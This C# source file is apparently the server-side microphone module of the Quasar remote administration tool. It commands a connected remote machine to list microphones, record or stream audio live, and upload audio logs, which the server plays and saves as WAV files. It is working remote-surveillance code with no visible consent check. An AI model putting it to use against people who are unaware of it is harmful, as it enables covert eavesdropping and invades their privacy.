using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using NAudio.Wave;

namespace Quasar.Server.Messages
{
    public class MicrophoneHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// The client which is associated with this microphone handler.
        /// </summary>
        public Client Client { get; }

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        public string BaseDownloadPath => _baseDownloadPath;

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        private readonly string _baseDownloadPath;

        /// <summary>
        /// Whether recording to file is currently enabled.
        /// </summary>
        private bool _recordingEnabled;

        /// <summary>
        /// WAV file writer for direct recording.
        /// </summary>
        private NAudio.Wave.WaveFileWriter _waveFileWriter;

        /// <summary>
        /// Current recording file path.
        /// </summary>
        private string _currentRecordingFile;

        /// <summary>
        /// Dictionary to store partial file transfers.
        /// </summary>
        private readonly Dictionary<string, FileTransferInfo> _activeTransfers;

        /// <summary>
        /// Fired when the microphone list is retrieved.
        /// </summary>
        public event EventHandler<string[]> MicrophonesReceived;

        /// <summary>
        /// Fired when audio logs list is retrieved.
        /// </summary>
        public event EventHandler<GetMicrophoneAudioLogsResponse> AudioLogsReceived;

        /// <summary>
        /// Fired when audio data is received.
        /// </summary>
        public event EventHandler<MicrophoneAudioData> AudioDataReceived;

        /// <summary>
        /// Fired when an audio file transfer is completed.
        /// </summary>
        public event EventHandler<string> AudioFileReceived;

        /// <summary>
        /// Audio output device for real-time playback.
        /// </summary>
        private WaveOutEvent _waveOut;

        /// <summary>
        /// Buffer provider for real-time audio playback.
        /// </summary>
        private BufferedWaveProvider _waveProvider;

        /// <summary>
        /// Indicates if real-time audio playback is enabled.
        /// </summary>
        public bool IsPlaybackEnabled { get; private set; }

        /// <summary>
        /// Current audio format for playback.
        /// </summary>
        private WaveFormat _currentAudioFormat;

        private class FileTransferInfo
        {
            public MemoryStream Stream { get; set; }
            public long ExpectedSize { get; set; }
            public int LastChunkIndex { get; set; }
            public string FileName { get; set; }
        }

        public MicrophoneHandler(Client client) : base(true)
        {
            Client = client;
            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, "Audio\\");
            _activeTransfers = new Dictionary<string, FileTransferInfo>();
            
            OnReport($"MicrophoneHandler initialized with path: {_baseDownloadPath}");
            
            // Create the audio directory if it doesn't exist
            if (!Directory.Exists(_baseDownloadPath))
            {
                Directory.CreateDirectory(_baseDownloadPath);
                OnReport($"Created audio directory: {_baseDownloadPath}");
            }
        }

        public override bool CanExecute(IMessage message) => message is GetMicrophonesResponse ||
                                                            message is GetMicrophoneAudioLogsResponse ||
                                                            message is MicrophoneAudioData;

        public override bool CanExecuteFrom(ISender sender) => Client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophonesResponse msg:
                    Execute(sender, msg);
                    break;
                case GetMicrophoneAudioLogsResponse msg:
                    Execute(sender, msg);
                    break;
                case MicrophoneAudioData msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetMicrophonesResponse message)
        {
            OnReport("Microphones retrieved successfully.");
            MicrophonesReceived?.Invoke(this, message.MicrophoneNames);
        }

        private void Execute(ISender client, GetMicrophoneAudioLogsResponse message)
        {
            OnReport("Audio logs retrieved successfully.");
            AudioLogsReceived?.Invoke(this, message);
        }

        private void Execute(ISender client, MicrophoneAudioData message)
        {
            try
            {
                if (message.IsRealTime)
                {
                    // Handle real-time audio data
                    
                    // Play audio in real-time if playback is enabled
                    if (IsPlaybackEnabled && _waveProvider != null && message.AudioData != null)
                    {
                        _waveProvider.AddSamples(message.AudioData, 0, message.AudioData.Length);
                    }
                    
                    // Save to file if recording is enabled
                    if (_recordingEnabled && _waveFileWriter != null && message.AudioData != null)
                    {
                        _waveFileWriter.Write(message.AudioData, 0, message.AudioData.Length);
                        _waveFileWriter.Flush(); // Ensure data is written immediately
                    }
                    
                    OnReport("Real-time audio data received.");
                }
                else
                {
                    // Handle file transfer only if recording is enabled
                    if (_recordingEnabled)
                    {
                        HandleFileTransfer(message);
                    }
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error processing audio data: {ex.Message}");
            }
        }

        private void HandleFileTransfer(MicrophoneAudioData message)
        {
            string transferKey = message.FileName;

            if (!_activeTransfers.ContainsKey(transferKey))
            {
                // Start new transfer
                _activeTransfers[transferKey] = new FileTransferInfo
                {
                    Stream = new MemoryStream(),
                    ExpectedSize = message.FileSize,
                    LastChunkIndex = -1,
                    FileName = message.FileName
                };
            }

            var transfer = _activeTransfers[transferKey];

            // Ensure chunks are received in order
            if (message.ChunkIndex == transfer.LastChunkIndex + 1)
            {
                transfer.Stream.Write(message.AudioData, 0, message.AudioData.Length);
                transfer.LastChunkIndex = message.ChunkIndex;

                OnReport($"Received chunk {message.ChunkIndex} of {message.FileName}");

                if (message.IsComplete)
                {
                    // Save the complete file
                    string filePath = Path.Combine(_baseDownloadPath, message.FileName);
                    OnReport($"Saving audio file to: {filePath}");
                    File.WriteAllBytes(filePath, transfer.Stream.ToArray());

                    // Clean up
                    transfer.Stream.Dispose();
                    _activeTransfers.Remove(transferKey);

                    OnReport($"Audio file saved: {message.FileName}");
                    AudioFileReceived?.Invoke(this, message.FileName);
                }
            }
            else
            {
                OnReport($"Chunk {message.ChunkIndex} received out of order for {message.FileName}");
            }
        }

        /// <summary>
        /// Retrieves the list of available microphones from the client.
        /// </summary>
        public void GetMicrophones()
        {
            OnReport("Retrieving microphones...");
            Client.Send(new GetMicrophones());
        }

        /// <summary>
        /// Starts microphone recording on the client.
        /// </summary>
        /// <param name="microphoneId">The ID of the microphone to use.</param>
        /// <param name="realTimeStreaming">Whether to enable real-time streaming.</param>
        /// <param name="quality">Audio quality (sample rate).</param>
        /// <param name="chunkDurationSeconds">Duration of each recording chunk in seconds.</param>
        public void StartRecording(string microphoneId, bool realTimeStreaming = false, int quality = 44100, int chunkDurationSeconds = 300)
        {
            OnReport($"Starting microphone recording (Device: {microphoneId}, Real-time: {realTimeStreaming})...");
            
            // Create WAV file for recording
            string fileName = $"audio_{DateTime.Now:yyyyMMdd_HHmmss}.wav";
            _currentRecordingFile = Path.Combine(_baseDownloadPath, fileName);
            var waveFormat = new NAudio.Wave.WaveFormat(quality, 16, 1);
            _waveFileWriter = new NAudio.Wave.WaveFileWriter(_currentRecordingFile, waveFormat);
            
            _recordingEnabled = true; // Enable recording when starting
            OnReport($"Recording to file: {_currentRecordingFile}");
            
            Client.Send(new DoStartMicrophoneRecording
            {
                MicrophoneId = microphoneId,
                RealTimeStreaming = realTimeStreaming,
                Quality = quality,
                ChunkDurationSeconds = chunkDurationSeconds
            });
        }

        /// <summary>
        /// Stops microphone recording on the client.
        /// </summary>
        public void StopRecording()
        {
            OnReport("Stopping microphone recording...");
            
            // Close WAV file if recording
            if (_waveFileWriter != null)
            {
                _waveFileWriter.Dispose();
                _waveFileWriter = null;
                OnReport($"Recording file saved: {_currentRecordingFile}");
                AudioFileReceived?.Invoke(this, Path.GetFileName(_currentRecordingFile));
            }
            
            _recordingEnabled = false; // Disable recording when stopping
            Client.Send(new DoStopMicrophoneRecording());
        }

        /// <summary>
        /// Retrieves the list of audio log files from the client.
        /// </summary>
        public void GetAudioLogs()
        {
            OnReport("Retrieving audio logs...");
            Client.Send(new GetMicrophoneAudioLogs());
        }

        /// <summary>
        /// Requests a specific audio file from the client.
        /// </summary>
        /// <param name="fileName">The name of the audio file to retrieve.</param>
        public void RequestAudioFile(string fileName)
        {
            OnReport($"Requesting audio file: {fileName}...");
            Client.Send(new DoRequestAudioFile { FileName = fileName });
        }

        /// <summary>
        /// Starts live listening without recording.
        /// </summary>
        /// <param name="microphoneId">The ID of the microphone to listen to.</param>
        /// <param name="quality">The audio quality (sample rate).</param>
        public void StartLiveListening(string microphoneId, int quality)
        {
            OnReport($"Starting live listening on microphone {microphoneId}...");
            Client.Send(new DoStartMicrophoneRecording
            {
                MicrophoneId = microphoneId,
                RealTimeStreaming = true, // Always real-time for live listening
                Quality = quality,
                ChunkDurationSeconds = 0 // No chunking for live listening
            });
        }

        /// <summary>
        /// Stops live listening.
        /// </summary>
        public void StopLiveListening()
        {
            OnReport("Stopping live listening...");
            Client.Send(new DoStopMicrophoneRecording());
        }

        /// <summary>
        /// Enables or disables recording to file while keeping the audio stream active.
        /// </summary>
        /// <param name="enabled">Whether to enable recording to file.</param>
        public void EnableRecording(bool enabled)
        {
            if (enabled && !_recordingEnabled)
            {
                // Start recording - create new WAV file
                string fileName = $"audio_{DateTime.Now:yyyyMMdd_HHmmss}.wav";
                _currentRecordingFile = Path.Combine(_baseDownloadPath, fileName);
                
                // Create WAV file with standard format (44100 Hz, 16-bit, mono)
                var waveFormat = new NAudio.Wave.WaveFormat(44100, 16, 1);
                _waveFileWriter = new NAudio.Wave.WaveFileWriter(_currentRecordingFile, waveFormat);
                
                OnReport($"Recording to file started: {_currentRecordingFile}");
            }
            else if (!enabled && _recordingEnabled)
            {
                // Stop recording - close WAV file
                if (_waveFileWriter != null)
                {
                    _waveFileWriter.Dispose();
                    _waveFileWriter = null;
                    OnReport($"Recording to file stopped: {_currentRecordingFile}");
                    AudioFileReceived?.Invoke(this, Path.GetFileName(_currentRecordingFile));
                }
            }
            
            _recordingEnabled = enabled;
        }

        /// <summary>
        /// Starts real-time audio playback.
        /// </summary>
        public void StartAudioPlayback()
        {
            StartAudioPlayback(new WaveFormat(44100, 16, 1)); // Default format
        }

        /// <summary>
        /// Starts real-time audio playback with specific format.
        /// </summary>
        public void StartAudioPlayback(WaveFormat format)
        {
            try
            {
                if (_waveOut == null)
                {
                    _currentAudioFormat = format;
                    _waveOut = new WaveOutEvent();
                    _waveProvider = new BufferedWaveProvider(_currentAudioFormat)
                    {
                        BufferLength = 1024 * 1024, // 1MB buffer
                        DiscardOnBufferOverflow = true
                    };
                    _waveOut.Init(_waveProvider);
                    _waveOut.Play();
                    IsPlaybackEnabled = true;
                    OnReport($"Audio playback started ({_currentAudioFormat.SampleRate}Hz, {_currentAudioFormat.BitsPerSample}-bit, {_currentAudioFormat.Channels}ch)");
                }
            }
            catch (Exception ex)
            {
                OnReport($"Failed to start audio playback: {ex.Message}");
            }
        }

        /// <summary>
        /// Stops real-time audio playback.
        /// </summary>
        public void StopAudioPlayback()
        {
            try
            {
                if (_waveOut != null)
                {
                    _waveOut.Stop();
                    _waveOut.Dispose();
                    _waveOut = null;
                    _waveProvider = null;
                    IsPlaybackEnabled = false;
                    OnReport("Audio playback stopped");
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error stopping audio playback: {ex.Message}");
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Clean up audio playback
                StopAudioPlayback();
                
                // Clean up any active transfers
                foreach (var transfer in _activeTransfers.Values)
                {
                    transfer.Stream?.Dispose();
                }
                _activeTransfers.Clear();
            }
        }
    }
}
